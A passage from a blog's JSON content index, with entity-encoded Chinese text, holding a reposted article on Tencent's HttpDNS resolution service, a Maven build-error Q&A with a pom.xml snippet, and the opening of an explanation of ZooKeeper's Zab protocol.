&#x56E2;&#x961F;&#x63A8;&#x51FA;&#x4E86;&#x4E00;&#x79CD;&#x5168;&#x65B0;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#xFF1A;HttpDNS&#x3002;HttpDNS&#x662F;&#x4E3A;&#x79FB;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;&#x91CF;&#x8EAB;&#x5B9A;&#x505A;&#x7684;&#x57FA;&#x4E8E;Http&#x534F;&#x8BAE;&#x548C;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x4E13;&#x6CBB;LocalDNS&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x4EE5;&#x53CA;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x4E0D;&#x51C6;&#x3002;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x5982;&#x4E0B;&#xFF1A; 1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A; HttpDNS&#x7684;&#x539F;&#x7406;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x4E3B;&#x8981;&#x6709;&#x4E24;&#x6B65;&#xFF1A; A&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;HttpDNS&#x63A5;&#x53E3;&#xFF0C;&#x83B7;&#x53D6;&#x4E1A;&#x52A1;&#x5728;&#x57DF;&#x540D;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E0A;&#x914D;&#x7F6E;&#x7684;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x6700;&#x4F18;&#x7684;IP&#x3002;&#xFF08;&#x57FA;&#x4E8E;&#x5BB9;&#x707E;&#x8003;&#x8651;&#xFF0C;&#x8FD8;&#x662F;&#x4FDD;&#x7559;&#x6B21;&#x9009;&#x4F7F;&#x7528;&#x8FD0;&#x8425;&#x5546;LocalDNS&#x89E3;&#x6790;&#x57DF;&#x540D;&#x7684;&#x65B9;&#x5F0F;&#xFF09; B&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x83B7;&#x53D6;&#x5230;&#x7684;IP&#x540E;&#x5C31;&#x5411;&#x76F4;&#x63A5;&#x5F80;&#x6B64;IP&#x53D1;&#x9001;&#x4E1A;&#x52A1;&#x534F;&#x8BAE;&#x8BF7;&#x6C42;&#x3002;&#x4EE5;Http&#x8BF7;&#x6C42;&#x4E3A;&#x4F8B;&#xFF0C;&#x901A;&#x8FC7;&#x5728;header&#x4E2D;&#x6307;&#x5B9A;host&#x5B57;&#x6BB5;&#xFF0C;&#x5411;HttpDNS&#x8FD4;&#x56DE;&#x7684;IP&#x53D1;&#x9001;&#x6807;&#x51C6;&#x7684;Http&#x8BF7;&#x6C42;&#x5373;&#x53EF;&#x3002; 2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;&#x4ECE;&#x539F;&#x7406;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;HttpDNS&#x53EA;&#x662F;&#x5C06;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;&#x534F;&#x8BAE;&#x7531;DNS&#x534F;&#x8BAE;&#x6362;&#x6210;&#x4E86;Http&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E0D;&#x590D;&#x6742;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E00;&#x5FAE;&#x5C0F;&#x7684;&#x8F6C;&#x6362;&#xFF0C;&#x5374;&#x5E26;&#x6765;&#x4E86;&#x65E0;&#x6570;&#x7684;&#x6536;&#x76CA;&#xFF1A; A&#x3001;&#x6839;&#x6CBB;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;&#x7531;&#x4E8E;&#x7ED5;&#x8FC7;&#x4E86;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#xFF0C;&#x7528;&#x6237;&#x89E3;&#x6790;&#x57DF;&#x540D;&#x7684;&#x8BF7;&#x6C42;&#x901A;&#x8FC7;Http&#x534F;&#x8BAE;&#x76F4;&#x63A5;&#x900F;&#x4F20;&#x5230;&#x4E86;&#x817E;&#x8BAF;&#x7684;HttpDNS&#x670D;&#x52A1;&#x5668;IP&#x4E0A;&#xFF0C;&#x7528;&#x6237;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x5C06;&#x4E0D;&#x4F1A;&#x906D;&#x53D7;&#x5230;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x56F0;&#x6270;&#x3002; B&#x3001;&#x8C03;&#x5EA6;&#x7CBE;&#x51C6;&#xFF1A;HttpDNS&#x80FD;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x5230;&#x7528;&#x6237;IP&#xFF0C;&#x901A;&#x8FC7;&#x7ED3;&#x5408;&#x817E;&#x8BAF;&#x81EA;&#x6709;&#x4E13;&#x5229;&#x6280;&#x672F;&#x751F;&#x6210;&#x7684;IP&#x5730;&#x5740;&#x5E93;&#x4EE5;&#x53CA;&#x6D4B;&#x901F;&#x7CFB;&#x7EDF;&#xFF0C;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x5C06;&#x7528;&#x6237;&#x5F15;&#x5BFC;&#x7684;&#x8BBF;&#x95EE;&#x6700;&#x5FEB;&#x7684;IDC&#x8282;&#x70B9;&#x4E0A;&#x3002; C&#x3001;&#x5B9E;&#x73B0;&#x6210;&#x672C;&#x4F4E;&#x5EC9;&#xFF1A;&#x63A5;&#x5165;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x4EC5;&#x9700;&#x8981;&#x5BF9;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x5165;&#x5C42;&#x505A;&#x5C11;&#x91CF;&#x6539;&#x9020;&#xFF0C;&#x65E0;&#x9700;&#x7528;&#x6237;&#x624B;&#x673A;&#x8FDB;&#x884C;root&#x6216;&#x8D8A;&#x72F1;&#xFF1B;&#x800C;&#x4E14;&#x7531;&#x4E8E;Http&#x534F;&#x8BAE;&#x8BF7;&#x6C42;&#x6784;&#x9020;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x517C;&#x5BB9;&#x5404;&#x7248;&#x672C;&#x7684;&#x79FB;&#x52A8;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x66F4;&#x4E0D;&#x6210;&#x95EE;&#x9898;&#xFF1B;&#x53E6;&#x5916;HttpDNS&#x7684;&#x540E;&#x7AEF;&#x914D;&#x7F6E;&#x5B8C;&#x5168;&#x590D;&#x7528;&#x73B0;&#x6709;&#x6743;&#x5A01;DNS&#x914D;&#x7F6E;&#xFF0C;&#x7BA1;&#x7406;&#x6210;&#x672C;&#x4E5F;&#x975E;&#x5E38;&#x4F4E;&#x3002;&#x603B;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;&#x5C31;&#x662F;&#x4EE5;&#x6700;&#x5C0F;&#x7684;&#x6539;&#x9020;&#x6210;&#x672C;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x4E1A;&#x52A1;&#x906D;&#x53D7;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x6EE1;&#x8DB3;&#x4E1A;&#x52A1;&#x7CBE;&#x786E;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x7684;&#x9700;&#x6C42;&#x3002; D&#x3001;&#x6269;&#x5C55;&#x6027;&#x5F3A;&#xFF1A;HttpDNS&#x63D0;&#x4F9B;&#x53EF;&#x9760;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x670D;&#x52A1;&#xFF0C;&#x4E1A;&#x52A1;&#x53EF;&#x5C06;&#x81EA;&#x6709;&#x8C03;&#x5EA6;&#x903B;&#x8F91;&#x4E0E;HttpDNS&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7ED3;&#x5408;&#xFF0C;&#x5B9E;&#x73B0;&#x66F4;&#x7CBE;&#x7EC6;&#x5316;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x3002;&#x6BD4;&#x5982;&#x6307;&#x5B9A;&#x7248;&#x672C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x6307;&#x5B9A;&#x7F51;&#x7EDC;&#x7C7B;&#x578B;&#x7684;&#x7528;&#x6237;&#x8FDE;&#x63A5;&#x6307;&#x5B9A;&#x7684;IP&#x5730;&#x5740;&#x7B49;&#x3002; &#x5F53;&#x7136;&#x5404;&#x4F4D;&#x53EF;&#x80FD;&#x4F1A;&#x95EE;&#xFF1A;&#x7528;&#x6237;&#x5C06;&#x9996;&#x9009;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x65B9;&#x5F0F;&#x5207;&#x6362;&#x5230;&#x4E86;HttpDNS&#xFF0C;&#x90A3;&#x4E48;HttpDNS&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x53C8;&#x662F;&#x5982;&#x4F55;&#x4FDD;&#x8BC1;&#x7684;&#x5462;&#xFF1F;&#x53E6;&#x5916;&#x4E0D;&#x540C;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5230;&#x540C;&#x4E00;&#x4E2A;HttpDNS&#x7684;&#x670D;&#x52A1;IP&#xFF0C;&#x7528;&#x6237;&#x7684;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x5982;&#x4F55;&#x4FDD;&#x8BC1;&#xFF1F; &#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x9AD8;&#x53EF;&#x7528;&#x53CA;&#x63D0;&#x5347;&#x7528;&#x6237;&#x4F53;&#x9A8C;&#xFF0C;HttpDNS&#x901A;&#x8FC7;&#x63A5;&#x5165;&#x4E86;&#x817E;&#x8BAF;&#x516C;&#x7F51;&#x4EA4;&#x6362;&#x5E73;&#x53F0;&#x7684;BGP Anycast&#x7F51;&#x7EDC;&#xFF0C;&#x4E0E;&#x5168;&#x56FD;&#x591A;&#x4E2A;&#x4E3B;&#x6D41;&#x8FD0;&#x8425;&#x5546;&#x5EFA;&#x7ACB;&#x4E86;BGP&#x4E92;&#x8054;&#xFF0C;&#x4FDD;&#x8BC1;&#x4E86;&#x8FD9;&#x4E9B;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x7528;&#x6237;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x5730;&#x8BBF;&#x95EE;&#x5230;HttpDNS&#x670D;&#x52A1;&#xFF1B;&#x53E6;&#x5916;HttpDNS&#x5728;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x8FDB;&#x884C;&#x4E86;&#x90E8;&#x7F72;&#xFF0C;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x53D1;&#x751F;&#x6545;&#x969C;&#x65F6;&#x5747;&#x80FD;&#x65E0;&#x7F1D;&#x5207;&#x6362;&#x5230;&#x5907;&#x4EFD;&#x8282;&#x70B9;&#xFF0C;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x89E3;&#x6790;&#x6B63;&#x5E38;&#x3002; &#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;&#x5F53;&#x524D;HttpDNS&#x5DF2;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x63A5;&#x5165;&#x4E86;&#x591A;&#x4E2A;&#x4E1A;&#x52A1;&#xFF0C;&#x8986;&#x76D6;&#x6570;&#x4EBF;&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x5DF2;&#x6301;&#x7EED;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x8D85;&#x8FC7;&#x4E00;&#x5E74;&#x65F6;&#x95F4;&#x3002;&#x800C;&#x63A5;&#x5165;&#x4E86;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x5728;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x65B9;&#x9762;&#x90FD;&#x6709;&#x4E86;&#x975E;&#x5E38;&#x5927;&#x7684;&#x63D0;&#x5347;&#x3002;&#x4EE5;&#x67D0;&#x4E2A;&#x63A5;&#x5165;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x4E3A;&#x4F8B;&#xFF0C;&#x8BE5;&#x4E1A;&#x52A1;&#x4EC5;&#x901A;&#x8FC7;&#x63A5;&#x5165;HttpDNS&#xFF0C;&#x5728;&#x672A;&#x505A;&#x4EFB;&#x4F55;&#x5176;&#x5B83;&#x4F18;&#x5316;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7528;&#x6237;&#x5E73;&#x5747;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x4E0B;&#x964D;&#x8D85;&#x8FC7;10%&#xFF0C;&#x8BBF;&#x95EE;&#x5931;&#x8D25;&#x7387;&#x4E0B;&#x964D;&#x4E86;&#x8D85;&#x8FC7;&#x4E94;&#x5206;&#x4E4B;&#x4E00;&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x7684;&#x6548;&#x679C;&#x63D0;&#x5347;&#x975E;&#x5E38;&#x663E;&#x8457;&#x3002;&#x53E6;&#x5916;&#x817E;&#x8BAF;&#x7684;HttpDNS&#x670D;&#x52A1;&#x9664;&#x4E86;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x88AB;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#x4EE5;&#x5916;&#xFF0C;&#x4E5F;&#x53D7;&#x5230;&#x4E86;&#x4E1A;&#x52A1;&#x540C;&#x884C;&#x7684;&#x80AF;&#x5B9A;&#x3002;&#x56FD;&#x5185;&#x6700;&#x5927;&#x7684;publicDNS&#x670D;&#x52A1;&#x5546;114dns&#x5728;&#x53D7;&#x5230;&#x817E;&#x8BAF;DNS&#x7684;&#x542F;&#x53D1;&#x4E0B;&#xFF0C;&#x4E5F;&#x63A8;&#x51FA;&#x4E86;HttpDNS&#x670D;&#x52A1;&#x3002; &#x5728;&#x672A;&#x6765;&#x7684;&#x65E5;&#x5B50;&#x91CC;&#xFF0C;&#x817E;&#x8BAF;GSLB&#x56E2;&#x961F;&#x5C06;&#x4F1A;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x8FDB;&#x4E00;&#x6B65;&#x63A8;&#x5E7F;HttpDNS&#x670D;&#x52A1;&#xFF0C;&#x5E76;&#x5C06;&#x5728;&#x5B9E;&#x9645;&#x4E1A;&#x52A1;&#x7684;&#x9700;&#x6C42;&#x4E0B;&#x5BF9;HttpDNS&#x670D;&#x52A1;&#x8FDB;&#x884C;&#x5347;&#x7EA7;&#xFF0C;&#x5982;&#x63D0;&#x4F9B;&#x66F4;&#x4E3A;&#x901A;&#x7528;&#x3001;&#x5B89;&#x5168;&#x3001;&#x7B80;&#x5355;&#x7684;&#x63A5;&#x5165;&#x534F;&#x8BAE;&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x5347;&#x63A5;&#x5165;&#x7528;&#x6237;&#x7684;&#x7F51;&#x7EDC;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x7B49;&#x7B49;&#x3002;&#x5E0C;&#x671B;HttpDNS&#x80FD;&#x4E3A;&#x5404;&#x4F4D;&#x5728;&#x89E3;&#x51B3;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x53CA;&#x5168;&#x5C40;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x5931;&#x6548;&#x65B9;&#x9762;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x3001;&#x53EF;&#x884C;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x4E5F;&#x6B22;&#x8FCE;&#x5404;&#x4F4D;&#x4E1A;&#x754C;&#x540C;&#x884C;&#x4E0E;&#x817E;&#x8BAF;&#x4E00;&#x8D77;&#xFF0C;&#x5C31;&#x5982;&#x4F55;&#x8FDB;&#x884C;&#x66F4;&#x7CBE;&#x51C6;&#x7684;&#x5168;&#x5C40;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x65B9;&#x9762;&#x8FDB;&#x884C;&#x66F4;&#x4E3A;&#x6DF1;&#x5165;&#x7684;&#x8BA8;&#x8BBA;&#x3002; &#x539F;&#x6587;&#x94FE;&#x63A5;&#xFF1A;http://www.zmke.com/i/8705.html","raw":null,"content":null,"categories":[{"name":"我的收藏","slug":"我的收藏","permalink":"http://www.wangxin123.com/categories/我的收藏/"}],"tags":[{"name":"HttpsDNS","slug":"HttpsDNS","permalink":"http://www.wangxin123.com/tags/HttpsDNS/"}]},{"title":"Maven常见问题汇总","slug":"Maven常见问题汇总","date":"2016-05-20T14:22:00.000Z","updated":"2017-02-21T08:44:41.717Z","comments":true,"path":"2016/05/20/Maven常见问题汇总/","link":"","permalink":"http://www.wangxin123.com/2016/05/20/Maven常见问题汇总/","excerpt":"&#x6700;&#x8FD1;&#x4F7F;&#x7528;maven&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x8BB0;&#x5F55;&#x5982;&#x4E0B;&#xFF0C;&#x65B9;&#x4FBF;&#x65E5;&#x540E;&#x67E5;&#x8BE2;&#x6240;&#x7528; Q&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;,&#x63D0;&#x793A;source-1.5&#x4E0D;&#x652F;&#x6301;diamond&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5EFA;&#x8BAE;&#x6362;&#x6210;1.7A&#xFF1A;&#x7F16;&#x8BD1;&#x7248;&#x672C;&#x51FA;&#x4E86;&#x95EE;&#x9898;&#xFF0C;&#x5728;pom.xml&#x76F8;&#x5E94;&#x4F4D;&#x7F6E;&#x6DFB;&#x52A0;1.7&#x6216;1.7&#x4EE5;&#x4E0A;&#x7684;source&#x548C;target&#x5373;&#x53EF;12345678910&lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.7&lt;/source&gt; &lt;target&gt;1.7&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; Q&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;&#xFF0C;&#x63D0;&#x793A;&#x7F16;&#x7801;GBK&#x7684;&#x4E0D;&#x53EF;&#x6620;&#x5C04;&#x5B57;&#x7B26;A&#xFF1A;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x5728;&#x95EE;&#x9898;1&#x7684;target&#x4EE3;&#x7801;&#x4E0B;&#x589E;&#x52A0;&#x4E0B;&#x9762;&#x4E00;&#x884C;&#x5373;&#x53EF;1&lt;encoding&gt;utf8&lt;/encoding&gt;","keywords":null,"text":"&#x6700;&#x8FD1;&#x4F7F;&#x7528;maven&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x8BB0;&#x5F55;&#x5982;&#x4E0B;&#xFF0C;&#x65B9;&#x4FBF;&#x65E5;&#x540E;&#x67E5;&#x8BE2;&#x6240;&#x7528; Q&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;,&#x63D0;&#x793A;source-1.5&#x4E0D;&#x652F;&#x6301;diamond&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5EFA;&#x8BAE;&#x6362;&#x6210;1.7A&#xFF1A;&#x7F16;&#x8BD1;&#x7248;&#x672C;&#x51FA;&#x4E86;&#x95EE;&#x9898;&#xFF0C;&#x5728;pom.xml&#x76F8;&#x5E94;&#x4F4D;&#x7F6E;&#x6DFB;&#x52A0;1.7&#x6216;1.7&#x4EE5;&#x4E0A;&#x7684;source&#x548C;target&#x5373;&#x53EF;12345678910&lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.7&lt;/source&gt; &lt;target&gt;1.7&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; Q&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;&#xFF0C;&#x63D0;&#x793A;&#x7F16;&#x7801;GBK&#x7684;&#x4E0D;&#x53EF;&#x6620;&#x5C04;&#x5B57;&#x7B26;A&#xFF1A;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x5728;&#x95EE;&#x9898;1&#x7684;target&#x4EE3;&#x7801;&#x4E0B;&#x589E;&#x52A0;&#x4E0B;&#x9762;&#x4E00;&#x884C;&#x5373;&#x53EF;1&lt;encoding&gt;utf8&lt;/encoding&gt; Q&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;&#xFF0C;&#x67D0;&#x4E2A;xml&#x6587;&#x4EF6;&#x63D0;&#x793A;&#x5982;&#x4E0B;&#x9519;&#x8BEF;1nested exception is com.sun.org.apache.xerces.internal.impl.io.MalformedByteSequenceException: Invalid byte 2 of 3-byte UTF-8 sequence A&#xFF1A;xml&#x6587;&#x4EF6;&#x4E2D;&#x58F0;&#x660E;&#x7684;&#x7F16;&#x7801;&#x4E0E;xml&#x6587;&#x4EF6;&#x672C;&#x8EAB;&#x4FDD;&#x5B58;&#x65F6;&#x7684;&#x7F16;&#x7801;&#x4E0D;&#x4E00;&#x81F4;&#x3002;&#x6BD4;&#x5982;&#x4F60;&#x7684;&#x58F0;&#x660E;&#x662F;UTF-8&#xFF0C;&#x4F46;&#x662F;&#x5374;&#x4EE5;ANSI&#x683C;&#x5F0F;&#x7F16;&#x7801;&#x4FDD;&#x5B58;&#x3002;&#x5C3D;&#x7BA1;&#x6587;&#x4EF6;&#x6CA1;&#x6709;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#xFF0C;&#x4F46;xml&#x89E3;&#x6790;&#x5668;&#x4ECD;&#x65E0;&#x6CD5;&#x89E3;&#x6790;&#x3002;&#x6709;&#x4E9B;&#x4EBA;&#x5EFA;&#x8BAE;&#x628A;xml&#x6539;&#x4E3A;GBK&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x53EF;&#x53D6;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x4E3A;&#xFF1A;&#x7528;&#x8BB0;&#x4E8B;&#x672C;&#x6253;&#x5F00;xml&#x6587;&#x4EF6;&#xFF0C;&#x91CD;&#x65B0;save&#x3002; Q&#xFF1A;&#x5C06;svn&#x7684;maven&#x9879;&#x76EE;checkout&#x81F3;Eclipse&#xFF0C;&#x6709;&#x65F6;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;1java.lang.NoClassDefFoundError: Lorg/apache/log4j/Logger&#x9519;&#x8BEF; A&#xFF1A;maven install&#x751F;&#x6210;&#x7684;jar&#x5305;&#x6CA1;&#x6709;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#xFF0C;&#x6309;&#x4E0B;&#x56FE;&#x914D;&#x7F6E;&#x5373;&#x53EF;","raw":null,"content":null,"categories":[{"name":"错误集锦","slug":"错误集锦","permalink":"http://www.wangxin123.com/categories/错误集锦/"}],"tags":[{"name":"Maven","slug":"Maven","permalink":"http://www.wangxin123.com/tags/Maven/"}]},{"title":"Zookeeper原理","slug":"Zookeeper原理","date":"2016-05-19T13:18:00.000Z","updated":"2017-01-08T12:05:39.978Z","comments":true,"path":"2016/05/19/Zookeeper原理/","link":"","permalink":"http://www.wangxin123.com/2016/05/19/Zookeeper原理/","excerpt":"Zookeeper&#x7684;&#x6838;&#x5FC3;&#x662F;&#x539F;&#x5B50;&#x5E7F;&#x64AD;&#xFF0C;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x4FDD;&#x8BC1;&#x4E86;&#x5404;&#x4E2A;Server&#x4E4B;&#x95F4;&#x7684;&#x540C;&#x6B65;&#x3002;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x7684;&#x534F;&#x8BAE;&#x53EB;&#x505A;Zab&#x534F;&#x8BAE;&#x3002;Zab&#x534F;&#x8BAE;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF0C;&#x5B83;&#x4EEC;&#x5206;&#x522B;&#x662F;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF08;&#x9009;&#x4E3B;&#xFF09;&#x548C;&#x5E7F;&#x64AD;&#x6A21;&#x5F0F;&#xFF08;&#x540C;&#x6B65;&#xFF09;&#x3002;&#x5F53;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x6216;&#x8005;&#x5728;&#x9886;&#x5BFC;&#x8005;&#x5D29;&#x6E83;&#x540E;&#xFF0C;Zab&#x5C31;&#x8FDB;&#x5165;&#x4E86;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF0C;&#x5F53;&#x9886;&#x5BFC;&#x8005;&#x88AB;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#xFF0C;&#x4E14;&#x5927;&#x591A;&#x6570;Server&#x5B8C;&#x6210;&#x4E86;&#x548C;leader&#x7684;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x4EE5;&#x540E;&#xFF0C;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x5C31;&#x7ED3;&#x675F;&#x4E86;&#x3002;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x4FDD;&#x8BC1;&#x4E86;leader&#x548C;Server&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x7CFB;&#x7EDF;&#x72B6;&#x6001;&#x3002; &#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4E8B;&#x52A1;&#x7684;&#x987A;&#x5E8F;&#x4E00;&#x81F4;&#x6027;&#xFF0C;zookeeper&#x91C7;&#x7528;&#x4E86;&#x9012;&#x589E;&#x7684;&#x4E8B;&#x52A1;id&#x53F7;&#xFF08;zxid&#xFF09;&#x6765;&#x6807;&#x8BC6;&#x4E8B;&#x52A1;&#x3002;&#x6240;&#x6709;&#x7684;&#x63D0;&#x8BAE;&#xFF08;proposal&#xFF09;&#x90FD;&#x5728;&#x88AB;&#x63D0;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E0A;&#x4E86;zxid&#x3002;&#x5B9E;&#x73B0;&#x4E2D;zxid&#x662F;&#x4E00;&#x4E2A;64&#x4F4D;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x5B83;&#x9AD8;32&#x4F4D;&#x662F;epoch&#x7528;&#x6765;&#x6807;&#x8BC6;leader&#x5173;&#x7CFB;&#x662F;&#x5426;&#x6539;&#x53D8;&#xFF0C;&#x6BCF;&#x6B21;&#x4E00;&#x4E2A;leader&#x88AB;&#x9009;&#x51FA;&#x6765;&#xFF0C;&#x5B83;&#x90FD;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x65B0;&#x7684;epoch&#xFF0C;&#x6807;&#x8BC6;&#x5F53;&#x524D;&#x5C5E;&#x4E8E;&#x90A3;&#x4E2A;leader&#x7684;&#x7EDF;&#x6CBB;&#x65F6;&#x671F;&#x3002;&#x4F4E;32&#x4F4D;&#x7528;&#x4E8E;&#x9012;&#x589E;&#x8BA1;&#x6570;&#x3002; &#x6BCF;&#x4E2A;Server&#x5728;&#x5DE5;&#x4F5C;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x4E09;&#x79CD;&#x72B6;&#x6001;&#xFF1A; LOOKING&#xFF1A;&#x5F53;&#x524D;Server&#x4E0D;&#x77E5;&#x9053;leader&#x662F;&#x8C01;&#xFF0C;&#x6B63;&#x5728;&#x641C;&#x5BFB; LEADING&#xFF1A;&#x5F53;&#x524D;Server&#x5373;&#x4E3A;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#x7684;leader 